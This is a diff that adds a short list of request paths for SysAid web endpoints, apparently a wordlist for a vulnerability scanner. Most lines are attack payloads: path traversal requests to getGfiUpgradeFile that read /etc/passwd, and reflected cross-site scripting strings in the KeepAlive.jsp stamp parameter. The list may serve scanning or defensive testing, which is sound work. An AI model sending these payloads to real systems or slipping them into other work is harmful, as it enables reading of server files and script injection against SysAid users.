@@ -1,0 +1,7 @@
+/sysaid/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd
+/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd
+/Login.jsp
+/InvalidAccount.jsp
+/favicon.ico
+/KeepAlive.jsp?stamp=16170297%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/KeepAlive.jsp?stamp=%3Cscript%3Ealert(document.domain)%3C/script%3E
